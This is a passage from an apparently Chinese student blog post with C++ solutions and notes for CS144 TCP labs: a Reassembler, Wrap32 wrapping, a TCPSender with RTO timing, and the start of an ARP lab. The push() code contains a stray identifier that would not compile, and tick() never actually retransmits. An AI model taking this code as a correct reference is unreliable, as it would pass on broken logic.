class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;reassembler.hh&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cassert&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Reassembler::is_closed</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> closed_ &amp;&amp; <span class="hljs-built_in">bytes_pending</span>() == <span class="hljs-number">0</span>; &#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Reassembler::insert</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> first_index, string data, <span class="hljs-type">bool</span> is_last_substring, Writer &amp;output)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (is_last_substring) &#123;<br>        closed_ = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Remember index_ points to where the current byte located at.</span><br>    <span class="hljs-comment">// 1. Unacceptable index: first_index overwhelms the capability range.</span><br>    <span class="hljs-comment">// 2. All overlapped: The end index of the substring is smaller than current index_.</span><br>    <span class="hljs-comment">// 3. data is empty.</span><br>    <span class="hljs-comment">// 4. No available space.</span><br>    <span class="hljs-keyword">if</span> (first_index &gt;= unassembled_index_ + output.<span class="hljs-built_in">available_capacity</span>() || <span class="hljs-comment">/* Out of bound */</span><br>        first_index + data.<span class="hljs-built_in">length</span>() - <span class="hljs-number">1</span> &lt; unassembled_index_ ||            <span class="hljs-comment">/* Data have been transferred */</span><br>        data.<span class="hljs-built_in">empty</span>() || output.<span class="hljs-built_in">available_capacity</span>() == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">is_closed</span>()) &#123;<br>            output.<span class="hljs-built_in">close</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> cap = output.<span class="hljs-built_in">available_capacity</span>();<br>    <span class="hljs-comment">// new_index actually distinguish where the current data start, the start index</span><br>    <span class="hljs-type">uint64_t</span> new_index = first_index;<br><br>    <span class="hljs-comment">// Data needs to fit the capability limitation</span><br>    <span class="hljs-keyword">if</span> (first_index &lt;= unassembled_index_) &#123;<br>        new_index = unassembled_index_;<br>        <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> overlapped_length = unassembled_index_ - first_index;<br>        data = data.<span class="hljs-built_in">substr</span>(overlapped_length, <span class="hljs-built_in">min</span>(data.<span class="hljs-built_in">size</span>() - overlapped_length, cap));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        data = data.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">min</span>(data.<span class="hljs-built_in">size</span>(), cap));<br>        <span class="hljs-keyword">if</span> (first_index + data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span> &gt; unassembled_index_ + cap - <span class="hljs-number">1</span>) &#123;<br>            data = data.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, unassembled_index_ + cap - first_index);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// Get the rear substring and merge the overlapped part</span><br>    <span class="hljs-keyword">auto</span> rear_iter = unassembled_substrings_.<span class="hljs-built_in">lower_bound</span>(new_index);<br>    <span class="hljs-keyword">while</span> (rear_iter != unassembled_substrings_.<span class="hljs-built_in">end</span>()) &#123;<br>        <span class="hljs-keyword">auto</span> &amp;[rear_index, rear_data] = *rear_iter;<br>        <span class="hljs-keyword">if</span> (new_index + data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span> &lt; rear_index) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125; <span class="hljs-comment">// No overlap conflict</span><br>        <span class="hljs-type">uint64_t</span> rear_overlapped_length = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (new_index + data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span> &lt; rear_index + rear_data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>) &#123;<br>            rear_overlapped_length = new_index + data.<span class="hljs-built_in">size</span>() - rear_index;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            rear_overlapped_length = rear_data.<span class="hljs-built_in">size</span>();<br>        &#125;<br>        <span class="hljs-comment">// Prepare for next rear early, because the data may be erased afterwards.</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> next_rear = rear_index + rear_data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (rear_overlapped_length == rear_data.<span class="hljs-built_in">size</span>()) &#123;<br>            unassembled_bytes_ -= rear_data.<span class="hljs-built_in">size</span>();<br>            unassembled_substrings_.<span class="hljs-built_in">erase</span>(rear_index);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// We don&#x27;t combine current data and rear data.</span><br>            <span class="hljs-comment">// Erase the overlapped part in current data is more efficient.</span><br>            data.<span class="hljs-built_in">erase</span>(data.<span class="hljs-built_in">end</span>() - <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int64_t</span>&gt;(rear_overlapped_length), data.<span class="hljs-built_in">end</span>());<br>        &#125;<br>        rear_iter = unassembled_substrings_.<span class="hljs-built_in">lower_bound</span>(next_rear);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (first_index &gt; unassembled_index_) &#123;<br>        <span class="hljs-keyword">auto</span> front_iter = unassembled_substrings_.<span class="hljs-built_in">upper_bound</span>(new_index);<br>        <span class="hljs-keyword">if</span> (front_iter != unassembled_substrings_.<span class="hljs-built_in">begin</span>()) &#123;<br>            front_iter--;<br>            <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;[front_index, front_data] = *front_iter;<br>            <span class="hljs-keyword">if</span> (front_index + front_data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span> &gt;= first_index) &#123;<br>                <span class="hljs-type">uint64_t</span> overlapped_length = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (front_index + front_data.<span class="hljs-built_in">size</span>() &lt;= first_index + data.<span class="hljs-built_in">size</span>()) &#123;<br>                    overlapped_length = front_index + front_data.<span class="hljs-built_in">size</span>() - first_index;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    overlapped_length = data.<span class="hljs-built_in">size</span>();<br>                &#125;<br>                <span class="hljs-keyword">if</span> (overlapped_length == front_data.<span class="hljs-built_in">size</span>()) &#123;<br>                    unassembled_bytes_ -= front_data.<span class="hljs-built_in">size</span>();<br>                    unassembled_substrings_.<span class="hljs-built_in">erase</span>(front_index);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    data.<span class="hljs-built_in">erase</span>(data.<span class="hljs-built_in">begin</span>(), data.<span class="hljs-built_in">begin</span>() + <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int64_t</span>&gt;(overlapped_length));<br>                    <span class="hljs-comment">// Don&#x27;t forget to update the inserted location</span><br>                    new_index = first_index + overlapped_length;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// If the processed data is empty, no need to insert it.</span><br>    <span class="hljs-keyword">if</span> (data.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">0</span>) &#123;<br>        unassembled_bytes_ += data.<span class="hljs-built_in">size</span>();<br>        unassembled_substrings_.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">make_pair</span>(new_index, std::<span class="hljs-built_in">move</span>(data)));<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = unassembled_substrings_.<span class="hljs-built_in">begin</span>(); iter != unassembled_substrings_.<span class="hljs-built_in">end</span>(); <span class="hljs-comment">/* nop */</span>) &#123;<br>        <span class="hljs-keyword">auto</span> &amp;[sub_index, sub_data] = *iter;<br>        <span class="hljs-keyword">if</span> (sub_index == unassembled_index_) &#123;<br>            <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> prev_bytes_pushed = output.<span class="hljs-built_in">bytes_pushed</span>();<br>            output.<span class="hljs-built_in">push</span>(sub_data);<br>            <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> bytes_pushed = output.<span class="hljs-built_in">bytes_pushed</span>();<br>            <span class="hljs-keyword">if</span> (bytes_pushed != prev_bytes_pushed + sub_data.<span class="hljs-built_in">size</span>()) &#123;<br>                <span class="hljs-comment">// Cannot push all data, we need to reserve the un-pushed part.</span><br>                <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> pushed_length = bytes_pushed - prev_bytes_pushed;<br>                unassembled_index_ += pushed_length;<br>                unassembled_bytes_ -= pushed_length;<br>                unassembled_substrings_.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">make_pair</span>(unassembled_index_, sub_data.<span class="hljs-built_in">substr</span>(pushed_length)));<br>                <span class="hljs-comment">// Don&#x27;t forget to remove the previous incompletely transferred data</span><br>                unassembled_substrings_.<span class="hljs-built_in">erase</span>(sub_index);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            unassembled_index_ += sub_data.<span class="hljs-built_in">size</span>();<br>            unassembled_bytes_ -= sub_data.<span class="hljs-built_in">size</span>();<br>            unassembled_substrings_.<span class="hljs-built_in">erase</span>(sub_index);<br>            iter = unassembled_substrings_.<span class="hljs-built_in">find</span>(unassembled_index_);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">break</span>; <span class="hljs-comment">// No need to do more. Data has been discontinuous.</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">is_closed</span>()) &#123;<br>        output.<span class="hljs-built_in">close</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">Reassembler::bytes_pending</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> unassembled_bytes_; &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;wrapping_integers.hh&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function">Wrap32 <span class="hljs-title">Wrap32::wrap</span><span class="hljs-params">( <span class="hljs-type">uint64_t</span> n, Wrap32 zero_point )</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// Your code here.</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">Wrap32</span>(<span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint32_t</span>&gt;(n &amp; <span class="hljs-number">0x00000000ffffffff</span>) + zero_point.raw_value_);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">Wrap32::unwrap</span><span class="hljs-params">( Wrap32 zero_point, <span class="hljs-type">uint64_t</span> checkpoint )</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// Your code here.</span><br>   <span class="hljs-type">int32_t</span> offset = <span class="hljs-keyword">this</span>-&gt;raw_value_ - <span class="hljs-built_in">wrap</span>(checkpoint, zero_point).raw_value_;<br>   <span class="hljs-type">int64_t</span> res = checkpoint + offset;<br>   <span class="hljs-keyword">return</span> res &gt;= <span class="hljs-number">0</span> ? res : res + (<span class="hljs-number">1ul</span> &lt;&lt; <span class="hljs-number">32</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>receiver</p><p>Lab3: sender</p><p>sender做什么</p><ol type="1"><li>尽可能填满window size大小的数据，发送</li><li>处理已经发送但是还没收到确认的数据（outstandingsegments），进行重传</li></ol><p>如何监测超时并重传，sender每个一段时间会调用一次tick函数，一般超时时间设置为1个RTT，在发送的时候，timer为0，并且当前数据报(segment)被放进outstandingsegments，表示还未收到确认报文；在一个RTT后没收到确认报文，就会导致重传</p><blockquote><p>看代码会发现计时器timer只有一个（是属于最新发送的segement的，因为每发送最新的segment就会重新计时），原本我以为每个segemnet都会有自己的计时器。但这样是合理的，同时超时时间设置为一个略大于RTT的大小很重要。想象一下，现在有先后发送了两个segment：1和2，这个时候如果收到了2，没收到1，那么在sender收到2的响应的时候是应该超出了一个RTT的，这就会导致在处理2响应的时候就会导致重传；或者说收到了1，没收到2，在收到1的时候，即使本次没有超时，也会在收到下一个segment响应的时候导致重传(遍历outstanding，segments)；那如果不会收到下一次响应怎么办，这个时候计时器是2的计时器，也会导致2的重传</p><p>RTO太短：导致很快重传，浪费资源</p><p>RTO太长：不会导致重传？</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* TCPSender constructor (uses a random ISN if none given) */</span><br>TCPSender::<span class="hljs-built_in">TCPSender</span>(<span class="hljs-type">uint64_t</span> initial_RTO_ms, optional&lt;Wrap32&gt; fixed_isn)<br>    : <span class="hljs-built_in">isn_</span>(fixed_isn.<span class="hljs-built_in">value_or</span>(Wrap32 &#123;<span class="hljs-built_in">random_device</span>()()&#125;)), <span class="hljs-built_in">initial_RTO_ms_</span>(initial_RTO_ms)<br>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">TCPSender::sequence_numbers_in_flight</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> outstanding_seqno_; &#125;<br><br><span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">TCPSender::consecutive_retransmissions</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> consecutive_retransmission_times_; &#125;<br><br><span class="hljs-function">optional&lt;TCPSenderMessage&gt; <span class="hljs-title">TCPSender::maybe_send</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!segments_out_.<span class="hljs-built_in">empty</span>() &amp;&amp; set_syn_) &#123;<br>        TCPSenderMessage segment = std::<span class="hljs-built_in">move</span>(segments_out_.<span class="hljs-built_in">front</span>());<br>        segments_out_.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">return</span> segment;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>&#125;<br><br><span class="hljs-comment">// 组装数据往outstanding_seg_和segments_out里写</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPSender::push</span><span class="hljs-params">(Reader &amp;outbound_stream)</span></span><br><span class="hljs-function"></span>&#123;<br>  <br>    <span class="hljs-comment">// 优先取响应里的ws，兜底为1</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> curr_window_size = window_size_ ? window_size_ : <span class="hljs-number">1</span>;<br>  <br>    <span class="hljs-comment">// 一直填充数据直到填满window</span><br>    <span class="hljs-keyword">while</span> (curr_window_size &gt; outstanding_seqno_) &#123;<br>        TCPSenderMessage msg;<br><br>      <span class="hljs-comment">// 如果是同步报文，也第一次，需要设置标志位</span><br>        <span class="hljs-keyword">if</span> (!set_syn_) &#123;<br>            msg.SYN = <span class="hljs-literal">true</span>;<br>            set_syn_ = <span class="hljs-literal">true</span>;<br>        &#125;<br><br>      <span class="hljs-comment">// 获取下一个数据的气势序列号</span><br>        msg.seqno = <span class="hljs-built_in">get_next_seqno</span>();<br>        <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> payload_size<br>            = <span class="hljs-built_in">min</span>(TCPConfig::MAX_PAYLOAD_SIZE, curr_window_size - outstanding_seqno_ - msg.SYN);<br>        std::string payload = std::<span class="hljs-built_in">string</span>(wangoutbound_stream.<span class="hljs-built_in">peek</span>()).<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, payload_size);<br>        <br>      <span class="hljs-comment">// 从 bytestream 指定大小读取数据</span><br>      outbound_stream.<span class="hljs-built_in">pop</span>(payload_size);<br><br>      <span class="hljs-comment">// 是否为FIN报文，如果不是，同时没有数据需要传送了，则说明结束了，设置FIN标志位</span><br>        <span class="hljs-keyword">if</span> (!set_fin_ &amp;&amp; outbound_stream.<span class="hljs-built_in">is_finished</span>()<br>            &amp;&amp; payload.<span class="hljs-built_in">size</span>() + outstanding_seqno_ + msg.SYN &lt; curr_window_size) &#123;<br>            msg.FIN = <span class="hljs-literal">true</span>;<br>            set_fin_ = <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        msg.payload = <span class="hljs-built_in">Buffer</span>(std::<span class="hljs-built_in">move</span>(payload));<br><br>        <span class="hljs-comment">// no data, stop sending</span><br>        <span class="hljs-keyword">if</span> (msg.<span class="hljs-built_in">sequence_length</span>() == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// no outstanding segments, restart timer</span><br>        <span class="hljs-keyword">if</span> (outstanding_seg_.<span class="hljs-built_in">empty</span>()) &#123;<br>            RTO_timeout_ = initial_RTO_ms_;<br>            timer_ = <span class="hljs-number">0</span>;<br>        &#125;<br><span class="hljs-comment">// 往待发送缓冲区填充</span><br>        segments_out_.<span class="hljs-built_in">push</span>(msg);<br>      <br><span class="hljs-comment">// 往未确认区域填充</span><br>        outstanding_seqno_ += msg.<span class="hljs-built_in">sequence_length</span>();<br>        outstanding_seg_.<span class="hljs-built_in">insert</span>(std::<span class="hljs-built_in">make_pair</span>(next_abs_seqno_, msg));<br>      <br>      <span class="hljs-comment">// 递增序列号，也就是期望下一次返回的ack </span><br>        next_abs_seqno_ += msg.<span class="hljs-built_in">sequence_length</span>();<br><br>      <span class="hljs-comment">// 收到FIN直接退出</span><br>        <span class="hljs-keyword">if</span> (msg.FIN) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function">TCPSenderMessage <span class="hljs-title">TCPSender::send_empty_message</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>    TCPSenderMessage segment;<br>    segment.seqno = <span class="hljs-built_in">get_next_seqno</span>();<br><br>    <span class="hljs-keyword">return</span> segment;<br>&#125;<br><br><span class="hljs-comment">// 接收数据的时候调用，处理数据</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPSender::receive</span><span class="hljs-params">(<span class="hljs-type">const</span> TCPReceiverMessage &amp;msg)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// 没有处需要处理的数据    </span><br>  <span class="hljs-keyword">if</span> (!msg.ackno.<span class="hljs-built_in">has_value</span>()) &#123;<br>        ; <span class="hljs-comment">// Don&#x27;t return directly</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// 转换接收的ack</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> recv_abs_seqno = msg.ackno.<span class="hljs-built_in">value</span>().<span class="hljs-built_in">unwrap</span>(isn_, next_abs_seqno_);<br>      <br>        <span class="hljs-comment">// 说明收到了已发送数据后的数据，一般不会如此</span><br>        <span class="hljs-keyword">if</span> (recv_abs_seqno &gt; next_abs_seqno_) &#123;<br>            <span class="hljs-comment">// Impossible, we couldn&#x27;t transmit future data</span><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><span class="hljs-comment">// 遍历outstanding_seg_，抹除掉已经确认的已发送数据的缓存，顺序从最先发送的开始到最近发送的</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = outstanding_seg_.<span class="hljs-built_in">begin</span>(); iter != outstanding_seg_.<span class="hljs-built_in">end</span>();) &#123;<br>            <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;[abs_seqno, segment] = *iter;<br>            <span class="hljs-keyword">if</span> (abs_seqno + segment.<span class="hljs-built_in">sequence_length</span>() &lt;= recv_abs_seqno) &#123;<br>                outstanding_seqno_ -= segment.<span class="hljs-built_in">sequence_length</span>();<br>                iter = outstanding_seg_.<span class="hljs-built_in">erase</span>(iter);<br>                <span class="hljs-comment">// reset RTO and if outstanding data is not empty, start timer</span><br>              <span class="hljs-comment">// 重置超时重传时间阈值</span><br>                RTO_timeout_ = initial_RTO_ms_;<br>                <span class="hljs-keyword">if</span> (!outstanding_seg_.<span class="hljs-built_in">empty</span>()) &#123;<br>                    timer_ = <span class="hljs-number">0</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        consecutive_retransmission_times_ = <span class="hljs-number">0</span>;<br>    &#125;<br>    window_size_ = msg.window_size;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPSender::tick</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">size_t</span> ms_since_last_tick)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// 累计时间，ms_since_last_tick是自上次tick被调用以来经过的时间，tick每隔几秒就吧被调用</span><br>    timer_ += ms_since_last_tick;<br>    <span class="hljs-keyword">auto</span> iter = outstanding_seg_.<span class="hljs-built_in">begin</span>();<br>    <span class="hljs-comment">// 如果时间超出了阈值且outstanding_seg_里有值</span><br>    <span class="hljs-keyword">if</span> (timer_ &gt;= RTO_timeout_ &amp;&amp; iter != outstanding_seg_.<span class="hljs-built_in">end</span>()) &#123;<br>        <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;[abs_seqno, segment] = *iter;<br>        <span class="hljs-keyword">if</span> (window_size_ &gt; <span class="hljs-number">0</span>) &#123;<br>            RTO_timeout_ *= <span class="hljs-number">2</span>;<br>        &#125;<br>        timer_ = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// 连续重传次数+1， TCPConnection 会使用这个信息用以判断 TCP 连接的可靠性， 太多连续的重传意味着 TCP 连接不稳定需要终止。</span><br>        consecutive_retransmission_times_++;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Lab 4：the network interface</p><p>本次的内容是实现ARP（地址解析协议）</p><figure><imgsrc="https://hangx-ma.github.io/norobots/images/2023-05-27-cs144-lab4/check4-structure.png"alt="network interface structure" /><figcaption aria-hidden="true">network interface structure</figcaption></figure><ul><li><p>TCP-in-UDP-in-IP： TCP 报文会被置于用户的数据报的 payload 中，在用户空间下这是最简单的实现方式： Linux 提供接口 （如 UDPSocket），而用户侧仅需要提供 payload， 目标地址， Linux 内核会负责将 UDP 报部， IP报头， 以太网报头组装起来， 将这个网络包发向下一个 hop。 Linux内核会保证每个 socket 会有独立的本地与远端地址以及端口号，并且保证这些数据在应用层的相互隔离。</p></li><li><p>TCP-in-IP： 一般情况下， TCP 报文会直接放在 Internet datagrams中， 这通常被成为 “TCP/IP”。 Linux 会提供一个 TUN 设备接口，需要应用层提供整个 Internet datagram， 而 Linux 内核则会处理剩下的部分。但此时应用层需要自己构建整个 IP 报头以及 payload 部分。</p></li><li><p>TCP-in-IP-in-Ethernet：以上的方法依赖Linux内核来实现的协议栈操作， 每次用户向 TUN 设备写入 IPdatagrams 时， Linux 都需要构建正确的带有 IP datagrams 的以太网帧作为payload。 这意味着 Linux 需要知悉下一个 hop 的以太网目的地址， 给出其 IP地址。 否则 Linux 会以广播的形式请求这些信息。</p></li></ul><p>这些功能是由 Network Interface 实现的， 该组件能将 IP数据报转义成以太网帧等等， 之后会传入 TAP 设备 （类似 TUN设备但更底层）， 实现对 link-layer 的数据帧的传输</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 